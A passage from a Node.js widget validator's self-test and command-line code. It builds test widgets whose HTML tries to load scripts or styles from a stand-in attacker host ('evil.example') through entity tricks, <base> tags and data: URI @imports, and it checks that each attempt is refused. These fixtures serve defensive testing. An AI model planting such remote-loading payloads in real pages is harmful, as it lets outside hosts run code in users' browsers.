    ['gt-inside-quoted-attribute', doc(BASE + '<script data-note=">" src="//evil.example/pwn.js"></script>'), 'external-script'],
    ['gt-inside-quoted-href', doc(BASE + '<link rel="stylesheet" data-note=">" href="//evil.example/x.css">'), 'external-style'],
    // A named reference outside the decoder's table: &bsol; is a backslash to HTML, and
    // the resolved URL is remote. Unresolved references are refused rather than guessed.
    ['named-ref-bsol', doc(BASE + '<script src="&bsol;&bsol;evil.example/pwn.js"></script>'), 'external-script'],
    ['unknown-named-ref', doc(BASE + '<script src="&fjord;evil.example/pwn.js"></script>'), 'external-script'],
    // ...while an ampersand written the way HTML asks for it still decodes and passes.
    ['amp-in-query', doc(BASE + '<script src="./helper.js?a=1&amp;b=2"></script>'), null],
    // #124 — the reference rules read the attribute; <base> supplies the other half of
    // the URL, so a relative src becomes remote without ever looking it.
    ['external-base', doc('<base href="//evil.example/">' + BASE + '<script src="pwn.js"></script>'), 'external-base'],
    ['external-base-scheme', doc('<base href="https://evil.example/">' + BASE), 'external-base'],
    // ...while a relative base stays inside the widget's own origin and is allowed.
    ['relative-base', doc('<base href="./sub/">' + BASE + '<script src="helper.js"></script>'), null],
    // #125 — a data: stylesheet is evaluated, and @import fetches whatever it names, so
    // the exemption that makes a packaged icon legal must not cover this.
    ['data-uri-stylesheet', doc(BASE + '<link rel="stylesheet" href="data:text/css,@import url(https://evil.example/x.css)">'), 'external-style'],
    ['data-uri-preload', doc(BASE + '<link rel="preload" as="script" href="data:text/javascript,alert(1)">'), 'external-style'],
    ['data-uri-unknown-rel', doc(BASE + '<link rel="something-new" href="data:text/css,x">'), 'external-style'],
    // ...while a relative script is the ordinary case and must stay accepted.
    ['relative-script', doc(BASE + '<script src="./helper.js"></script>'), null],
  ];
  const manifest = {
    id: 'ww.selftest.fixture', name: 'Fixture', author: 'WW', description: 'self-test',
    version: '1.0.0', min_api_version: 1, supported_slots: ['quarter'], properties: [],
  };
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ww-validate-'));
  let htmlBad = 0;
  for (const [name, body, expected] of htmlCases) {
    const dir = path.join(tmp, name);
    fs.mkdirSync(dir);
    fs.writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(manifest));
    fs.writeFileSync(path.join(dir, 'index.html'), body);
    const rules = validate(dir).errors.map((e) => e.rule);
    if (expected === null && rules.length) {
      console.log(`  FAIL html "${name}" should validate, but raised ${rules.join(', ')}`); htmlBad++;
    } else if (expected !== null && !rules.includes(expected)) {
      console.log(`  FAIL html "${name}" should raise ${expected}, raised ${rules.join(', ') || 'nothing'}`); htmlBad++;
    }
  }
  // Property rules, same treatment. `help` is the newest of them and the one whose
  // failure is quietest: a manifest the validator passes but the host cannot
  // deserialize is a widget that simply is not there, with no message anywhere the
  // author will look (#207).
  const propCases = [
    ['help-string', { name: 'apiToken', label: 'Token', type: 'secret', help: 'Where to get it.' }, null],
    ['help-absent-on-text', { name: 'city', label: 'City', type: 'text' }, null],
    ['help-missing-on-secret', { name: 'apiToken', label: 'Token', type: 'secret' }, 'prop-secret-help'],
    ['help-blank-on-secret', { name: 'apiToken', label: 'Token', type: 'secret', help: '   ' }, 'prop-secret-help'],
    // The three shapes String() would have accepted: each is non-empty as a string and
    // each is a JsonException on the way into WidgetProperty.Help.
    ['help-object', { name: 'apiToken', label: 'Token', type: 'secret', help: {} }, 'prop-help-type'],
    ['help-array', { name: 'apiToken', label: 'Token', type: 'secret', help: ['a'] }, 'prop-help-type'],
    ['help-number', { name: 'city', label: 'City', type: 'text', help: 42 }, 'prop-help-type'],
    // ...and a secret whose help is an object is BOTH: unloadable and unguided.
    ['help-object-on-secret', { name: 'apiToken', label: 'Token', type: 'secret', help: {} }, 'prop-secret-help'],
  ];
  let propBad = 0;
  for (const [name, prop, expected] of propCases) {
    const dir = path.join(tmp, 'prop-' + name);
    fs.mkdirSync(dir);
    fs.writeFileSync(path.join(dir, 'manifest.json'),
      JSON.stringify(Object.assign({}, manifest, { properties: [prop] })));
    fs.writeFileSync(path.join(dir, 'index.html'), doc(BASE));
    const rules = validate(dir).errors.map((e) => e.rule);
    if (expected === null && rules.length) {
      console.log(`  FAIL prop "${name}" should validate, but raised ${rules.join(', ')}`); propBad++;
    } else if (expected !== null && !rules.includes(expected)) {
      console.log(`  FAIL prop "${name}" should raise ${expected}, raised ${rules.join(', ') || 'nothing'}`); propBad++;
    }
  }
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log(htmlBad
    ? `${htmlBad} of ${htmlCases.length} html rule cases disagree`
    : `html rules agree with all ${htmlCases.length} cases`);
  console.log(propBad
    ? `${propBad} of ${propCases.length} property rule cases disagree`
    : `property rules agree with all ${propCases.length} cases`);
  process.exit(bad || htmlBad || propBad ? 1 : 0);
}

const targets = args.filter((a) => !a.startsWith('--'));
if (!targets.length) {
  console.error('usage: validate-widget.js [--json] <widget-folder>  |  [--json] --all <widgets-dir>');
  process.exit(1);
}

let folders = targets;
if (all) {
  folders = [];
  for (const dir of targets) {
    for (const name of fs.readdirSync(dir)) {
      const f = path.join(dir, name);
      if (fs.existsSync(path.join(f, 'manifest.json'))) folders.push(f);
    }
  }
}

const reports = folders.map(validate);
if (asJson) console.log(JSON.stringify(all ? reports : reports[0], null, 1));
else console.log(reports.map(human).join('\n'));
process.exit(reports.every((r) => r.ok) ? 0 : 1);
